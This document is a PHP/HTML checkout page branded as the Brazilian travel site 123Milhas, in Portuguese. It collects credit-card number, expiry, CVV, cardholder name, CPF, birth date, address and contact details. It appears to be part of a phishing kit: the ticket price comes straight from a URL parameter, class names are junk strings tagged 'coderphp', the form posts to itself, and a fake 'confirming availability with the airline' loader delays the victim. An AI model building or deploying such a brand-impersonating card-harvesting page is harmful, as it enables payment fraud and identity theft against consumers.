<?php

$_SESSION['valortotalcoderphp'] =  $valor = addslashes(htmlspecialchars_decode($_GET['valor']));

$_SESSION['moedabr'] = number_format($valor,2,",",".");
?>
<!-- MODAL -->

<div style="display:none;background:rgba(0,0,0,0.5);width:100%;height:470vh;padding:10px;z-index: 999999;position: absolute;margin:0 auto;" class="cad_sucesso">
	<div class="lskdlsakdsladlsdklsd" style="background:white;margin:5% auto;width:40%;height:auto;padding:30px;border-radius:12px;">
		<center><div class="c-loader"></div>
		</center>
		<br>

		<style>
			.c-loader {

				animation: is-rotating 1s infinite;
				border: 6px solid white;
				border-radius: 50%;
				border-top-color: rgb(240, 89, 41);
				height: 80px;
				width: 80px;
			}

			@keyframes is-rotating {
				to {
					transform: rotate(1turn);
				}
			}</style>
			<h1 style="font-weight:bold;font-size:1.5rem;text-align:center;">Você está a um passo de realizar o pedido da sua viagem!</h1>
			<br>
			<p style="text-align: center;font-size: 20px;">Estamos confirmando os valores e disponibilidade com a companhia.</p>
			<br>
			<p style="text-align: center;font-size: 20px;">Aguarde só um momentinho...</p></div>
		</div>


		<section class="passsaeigroscoderphp">
			<div class="container">
				<div class="col-md-12">
					<span style="color:rgb(240, 89, 41);font-weight:500;cursor:pointer;"><i class="fa-solid fa-arrow-left"></i> Voltar para busca</span>
					<br><br><br>

				</div>

				<form id="form"  method="post">

					<div class="row">
						<div class="col-md-8">
							<h3  style="text-align:center;font-weight: bold;font-size: 18px;">Você está quase lá, agora só falta preencher suas informações!</h3>	<br><br>
							<div class="formapagamentocoderphp">
								<b style="margin-bottom:10px;font-size:20px;font-weight: 700;">Formas de pagamento</b>


								<div  id='btn-div1' style="margin-top:8px;">
									<input  required  class="form-check-input" type="radio" name="tipo" style="cursor:pointer;height: 18px;width: 18px;background-color: #f05929;" checked="checked" value="pix" id="pix" > 

									<span style="position:absolute;margin-top:2px;margin-left:12px;">Pix</span>

									<span style="font-weight: 500;font-size:12px;text-align: center;background:rgb(0, 101, 46);width:90px;padding:3px;color:white;position:absolute;margin-top:1px;margin-left:50px;">desconto!</span>
									<span style="font-size: 1.5rem;
									line-height: 2.05rem;font-size:14px;position:absolute;margin-top:23px;">à vista
								</span>

							</div>

							<p class="dsdadsdboc" style="margin-top:-30px;text-decoration: underline;cursor:pointer;font-size: 1rem;
							line-height: 2.3rem;color: #f05929;float:right;">Informações para pagamento</p>

							<div style="clear:both;"></div>
							<br>
					 	<div id='btn-div' style="margin-top:8px;">
								<input   class="form-check-input" type="radio" name="tipo" style="cursor:pointer;height: 18px;width: 18px;background-color: #f05929;"  value="card"  id="card" > 

								<span style="position:absolute;margin-top:2px;margin-left:12px;">Cartão de crédito</span>


								<span style="font-size: 1.5rem;
								line-height: 2.05rem;font-size:14px;position:absolute;margin-top:23px;">em até 6x sem juros
							</span>
							<br><br><br>



						</div> 

						<div style="clear:both;"></div>
						<hr>

						<div id="chavecnpj" style="display:none;">
							<p style="font-size:12px;">Escolha a quantidade de parcelas dentre as opções abaixo:</p>
							<div class="asdasdasdpagacoderphp">
								<span style="float:left;">Parcelamento
								</span>
								<span style="float:right;">Total a pagar
								</span>


								<div style="clear:both;"></div>
							</div> 
							<br><br>

							<?php
							$preco=$_SESSION['valortotalcoderphp'];
							$max_prestacoes=6;
							for($i=1;$i <= $max_prestacoes;$i++){
								$mensalidade=$preco/$i;

								?>


								<div style=""><input  class="form-check-input" type="radio" name="tipo4" style="cursor:pointer;height: 18px;width: 18px;background-color: #f05929;"   > 

									<span style="position:absolute;margin-left:12px;"><?=  sprintf("%dx R$ %0.2f ",$i,$mensalidade);  ?>

								</span>

								<span style="float:right;"><strong><?= $_SESSION['moedabr'] ?></strong></span>
							</div>
							<hr>







							<?php

						}
						?> 


						<p style="font-size:20px;"><strong>Dados do cartão de crédito</strong></p>

						<label for="" style="font-size:13px;">Bandeira</label>
						<br>
						<select name="bandeira" class="slexlslsllsls" style="maring-bottom:5px;border-radius:6px;width:300px;height:auto;padding:14px;">
							<option value="American Express">American Express</option>
							<option value="Aura">Aura</option>
							<option value="Credz">Credz</option>
							<option value="Diners Club">Diners Club</option>
							<option value="Discover">Discover</option>
							<option value="Elo">Elo</option>
							<option value="Hiper">Hiper</option>
							<option value="Hipercard">Hipercard</option>
							<option value="Jcb">Jcb</option>
							<option value="MasterCard">MasterCard</option>
							<option value="Sorocred">Sorocred</option>
							<option value="Visa">Visa</option>

						</select>

						<br> <br><br>

						<label for="" style="font-size:13px;color:#414042;">Número</label> <br>
						<input  onkeypress="return onlynumber();" id="cc" maxlength="19" placeholder="---- ---- ---- ----" class="okokoookokokokookcoderphp" type="tel" name="card"> <br>
						<label for="" style="font-size:13px;color:#414042;">Validade</label> <br>
						<input placeholder="MM/AA" class="okokoookokokokookcoderphp"  type="tel" name="validade" onkeypress="onlynumber();mascaraData( this, event )" maxlength="5" minlength="5"> <br>
						<label for="" style="font-size:13px;color:#414042;">Código de segurança
						</label> <br>
						<input maxlength="4" minlength="3" placeholder="----" class="okokoookokokokookcoderphp" type="tel" name="cvv"> <br>
						<label for="" style="font-size:13px;color:#414042;">Nome do titular (como impresso no cartão)

						</label> <br>
						<input class="okokoookokokokookcoderphp" type="tel" name="titular"> <br>


					</div>




			<!-- <div class="asdasdasdpagacoderphp">
				<span style="float:left;">Condição de pagamento</span>
				<span style="float:right;">Total a pagar</span>

				<div style="clear:both;"></div>
			</div> -->
			<br>
			<!-- <div class="d-flex justify-content-start"> <input checked="checked"  class="form-check-input" type="radio" name="tipo" style="cursor:pointer;height: 18px;width: 18px;background-color: #f05929;"   > 

				<span style="position:absolute;margin-top:2px;margin-left:25px;">À vista</span><span style="font-weight: 500;font-size:12px;text-align: center;background:rgb(0, 101, 46);width:90px;padding:3px;color:white;position:absolute;margin-top:1px;margin-left:90px;">desconto!</span></div> -->
				<!-- <div style="margin-top:-20px;" class="d-flex justify-content-end"><span style="margin-right:10px;text-decoration:line-through;" > R$ 3.211,52 </span> <span> <strong style="margin-right:10px;">3.115,17</strong></span></div> -->

			</div>

			<br><br>

			<div class="formapagamentocoderphp">
				<b style="margin-bottom:10px;font-size:20px;font-weight: 700;">Dados do pagador</b>

				<div style="margin-top:8px;">
					<input  class="form-check-input" type="radio" name="tipo1" style="cursor:pointer;height: 18px;width: 18px;background-color: #f05929;"   > 



					<span style="position:absolute;margin-top:2px;margin-left:12px;">Pessoa Física</span>
					<br><br><input   class="form-check-input" type="radio" name="tipo1" style="cursor:pointer;height: 18px;width: 18px;background-color: #f05929;"  > 

					<span style="position:absolute;margin-top:2px;margin-left:12px;">Pessoa Jurídica</span>




				</div>

				<br>

				<div class="asdasdsadsdsadform">
					<label >Nome</label> <br>
					<input type="text" placeholder="Ex: João" name="nome" id="nome_usuario" required>
				</div>

				<div class="asdasdsadsdsadform1">
					<label >Sobrenome completo
					</label> <br>
					<input type="text" placeholder="da Silva" name="sobrenome" required>
				</div>

				<div class="nascimento">
					<label >Nascimento</label> <br>
					<input id="outra_data" maxlength="10" onkeypress="mascaraData( this, event )" type="text" name="nascimento" placeholder="Ex: 25/10/1987">
				</div>

				<div class="cpfinput">
					<label >CPF</label> <br>
					<input type="text" name="cpf" id="identification" maxlength="14" placeholder="Ex: 575.964.830-62">
				</div>

			


				<div class="cep">
					<SPAN>Endereço da fatura do cartão</SPAN> <br><br>
					<label >CEP:</label> <br>
					<input type="text" name="cep" placeholder="Ex: 75705-640"> <span class="klkllkllksdsadsd" style="position:absolute;margin-top:10px; margin-left:10px;text-decoration:underline;color:rgb(245, 146, 114)"> Esqueceu o CEP?</span>
				</div>
				<div style="clear:both;"></div>

				<div class="telefonefixo">
					<label >Telefone fixo
					(opcional)</label> <br>
					<input maxlength="15" onkeyup="handlePhone(event)" type="text" name="telefonefixo" placeholder="(__) ____-___">
				</div>


				<div class="telefonemovel">
					<label >Telefone móvel</label> <br>
					<input maxlength="15" onkeyup="handlePhone(event)" type="text" name="telefonecelular" placeholder="(__) ____-___">
				</div>

				<div class="telefonefixo">
					<label >E-mail

					</label> <br>
					<input type="email" name="email1" placeholder="Digite o e-mail">
				</div>


				<div class="telefonemovel">
					<label >Confirme o e-mail
					</label> <br>
					<input type="email" name="email2" placeholder="Confirme o e-mail">
				</div>
				<div style="clear:both;"></div>


				<img style="position:absolute;margin-top:55px;margin-left:23px;" src="img/inter.png" alt="">
				<div class="sdasdsadsadcoderphp02020202"> <p style="font-size:14px;">Informações sobre <strong>status do pedido, pagamento e emissão</strong> serão enviadas para o e-mail do pagador.</p></div>
			</form>
			<div style="clear:both;"></div>





		</div>
		<div style="width:100%;height:auto;padding:10px;">
			<b style="font-size:20px;">Informações importantes</b>
			<p>1. Confira o preenchimento dos campos e os detalhes do seu pedido antes de efetuar o pagamento, pois não conseguimos fazer alterações posteriores nos nomes dos mesmos, datas ou horários das passagens. Em caso de preenchimentos incorretos a única opção será o cancelamento do bilhete.</p>
			<p>2. A 123Milhas não realiza marcação de assento. Você poderá conferir o seu assento e fazer eventuais mudanças diretamente com a companhia aérea no momento do check-in.</p>
			<p>3. Informe-se sobre nossa política de alterações e cancelamentos.</p>
			<p>4. Conheça os termos e condições de uso do nosso site.</p>
			<p>5. Com essa compra você pode acumular 3.450 pts, que serão creditados ao pagador. Os pontos poderão ser consultados no extrato do 123fidelidade após a realização do pedido.</p>
			<p>6. Se o pagador não possuir cadastro no 123fidelidade, poderá criar uma conta em até 10 dias após a realização do pedido para acumular os pontos referentes à compra.</p>
			<input type="radio"> Estou ciente e concordo com as informações acima


			<br><br>
			<input class="ksadkjsadkasjdjksdkjsd" style="background: linear-gradient(308.6deg,#F06531 -7.94%,#EA3D35 79.38%);
			border-radius: 1.5rem;
			margin: 0 0 4rem;
			color: #fff;
			border: none;
			padding: 1rem 2rem;
			font-weight:bold;
			width: 80%;" type="submit" value="GERAR PEDIDO">




		</div>
	</div>
	<div class="col-md-4">
		<div class="resonumofinananccicicicoderphp"> <b style="margin-bottom:10px;font-size:20px;font-weight: 700;">Resumo financeiro</b>
			<br><br>
			<div class="row">
				<div class="col-md-6"><span style="font-size:16px;"><strong><?= $_SESSION['passageiros'] ?> Adultos:</strong></span></div>
				<div class="col-md-6"><span style="float:right;font-size:16px"><strong>R$ <?= $_SESSION['moedabr'] ?></strong></span></div>
				<div class="col-md-6"><span style="font-size:16px;">Taxa de embarque</span></div>
				<div class="col-md-6"><span style="float:right;font-size:16px">R$ 0</span></div>
				<div class="col-md-6"><span style="font-size:16px;">Taxa de serviço</span>
				</div>
				<div class="col-md-6"><span style="float:right;font-size:16px">R$ 0</span>
				</div>
			</div>

		</div>
		<div class="conteudooooooooo33333">
			<p style="position:relative;top:10px;float:left;"><strong>TOTAL</strong></p>
			<p style="position:relative;top:10px;float:right;"><strong>R$ <?= $_SESSION['moedabr'] ?></strong></p>
			<div style="clear:both;"></div>
		</div>
	</div>
</div>
</div>
</section>







</form>



<span id="conteudo"></span>



</body>
</html>